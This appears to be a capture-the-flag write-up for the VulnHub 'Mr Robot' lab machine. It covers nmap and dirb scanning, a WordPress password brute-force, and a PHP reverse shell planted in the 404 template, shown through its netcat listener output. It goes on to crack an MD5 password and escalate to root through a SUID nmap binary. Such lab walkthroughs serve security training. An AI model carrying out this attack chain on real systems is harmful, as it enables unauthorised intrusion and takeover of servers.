Mr Robot

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] Wordpress bruteforce
[+] MD5 - Password Cracking @ Crackstation
[+] Privilege Esclation with nmap --interactive (SUID)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-05 04:24 EST
Nmap scan report for 192.168.56.104
Host is up (0.00081s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 08:00:27:F7:40:77 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.81 ms 192.168.56.104

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Dirb Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# dirb http://192.168.56.104

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Nov  5 04:37:33 2019
URL_BASE: http://192.168.56.104/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.104/ ----
==> DIRECTORY: http://192.168.56.104/0/                                        
==> DIRECTORY: http://192.168.56.104/admin/                                    
+ http://192.168.56.104/atom (CODE:301|SIZE:0)                                 
==> DIRECTORY: http://192.168.56.104/audio/                                    
==> DIRECTORY: http://192.168.56.104/blog/                                     
==> DIRECTORY: http://192.168.56.104/css/                                      
+ http://192.168.56.104/dashboard (CODE:302|SIZE:0)                            
+ http://192.168.56.104/favicon.ico (CODE:200|SIZE:0)                          
==> DIRECTORY: http://192.168.56.104/feed/                                     
==> DIRECTORY: http://192.168.56.104/image/                                    
==> DIRECTORY: http://192.168.56.104/Image/                                    
==> DIRECTORY: http://192.168.56.104/images/                                   
+ http://192.168.56.104/index.html (CODE:200|SIZE:1077)                        
+ http://192.168.56.104/index.php (CODE:301|SIZE:0)                            
+ http://192.168.56.104/intro (CODE:200|SIZE:516314)                           
==> DIRECTORY: http://192.168.56.104/js/                                       
+ http://192.168.56.104/license (CODE:200|SIZE:309)                            
+ http://192.168.56.104/login (CODE:302|SIZE:0)                                
+ http://192.168.56.104/page1 (CODE:301|SIZE:0)                                
^[t                                                                             + http://192.168.56.104/phpmyadmin (CODE:403|SIZE:94)                          
+ http://192.168.56.104/rdf (CODE:301|SIZE:0)                                  
+ http://192.168.56.104/readme (CODE:200|SIZE:64)                              
+ http://192.168.56.104/robots (CODE:200|SIZE:41)                              
+ http://192.168.56.104/robots.txt (CODE:200|SIZE:41) 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting content of robots.txt we found a dictionary file

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# curl http://www.example.com/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Going to http://www.example.com/wp-login we get the information that the user is elliot.

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/mr.Robot/mr.robot1.png

After brute forcing the password for elliot using dictionary “ fsocity.dic” we get the following credentials:

username : elliot
password : ER28-0652

Logging into Wordpress

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/mr.Robot/mr.robot2.png)

We try to modify a standart 404 error page and add a reverse shell instead of the code for page not found .

After adding the code for the php- reverse-shell we get a reverse shell on the listenting port on kali linux .

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.104] 40889
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 11:59:34 up 35 min,  0 users,  load average: 1.38, 1.57, 1.55
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ id

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting password for user robot

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
daemon@linux:/home/robot$ cat pass	
cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Using Crack Station to crack the password

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/mr.Robot/mr.robot3.png)


Getting user robot

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@linux:~$ cat key	
cat key-2-of-3.txt 
822c73956184f694993bede3eb39f959


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Find SUID

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Privilege escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# whoami
whoami
root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

